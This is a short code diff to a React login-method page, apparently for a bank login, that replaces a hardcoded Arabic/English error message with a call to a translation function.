@@ -7,7 +7,7 @@ import { toast } from "sonner";
 export default function LoginMethod() {
   const [, setLocation] = useLocation();
   const search = useSearch();
-  const { language, setLanguage } = useLanguage();
+  const { language, setLanguage, t } = useLanguage();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
   const sessionId = localStorage.getItem("sessionId") || "";
@@ -125,7 +125,7 @@ export default function LoginMethod() {
       <div className="container">
         {showError && (
           <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-            {isArabic ? "برجاء التحقق من البيانات الصحيحه وإعادة المحاوله" : "Please check the correct data and try again"}
+            {t("invalid_data")}
           </div>
         )}
         <div
